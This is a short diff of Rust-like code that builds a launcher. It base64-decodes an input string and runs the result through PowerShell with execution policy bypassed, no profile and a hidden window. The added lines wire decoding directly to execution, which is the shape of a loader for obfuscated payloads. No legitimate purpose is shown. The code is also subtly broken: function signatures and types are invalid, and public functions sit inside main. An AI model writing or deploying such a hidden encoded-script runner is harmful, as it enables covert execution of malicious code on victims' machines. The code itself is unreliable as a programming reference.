@@ -6,14 +6,14 @@ use std::process::Command;
 use std::process::Stdio;
 use std::vec::Vec;
 
-fn main(b64: str) -> Output {
+fn main(b64: str) -> vec<Stdio> {
 
     pub fn decode_bytes(b64: str) -> str {
         return decode(b64).unwrap();
     }
     pub fn execute_script(scr: str) -> vec<Stdio> {
         let quoted_scr: str = concat!("\"", scr, "\"");
-        let output = Command::new("powershell.exe")
+        let output = Command::new("powershell")
             .arg("-ExecutionPolicy Bypass")
             .arg("-NoProfile")
             .arg("-WindowStyle Hidden")
@@ -23,4 +23,7 @@ fn main(b64: str) -> Output {
         let ret = vec![output.stdout, output.stderr];
         return ret
     }
+    let scr: str = decode_bytes(b64);
+    let ret: vec<Stdio> = execute_script(scr);
+    return ret
 }
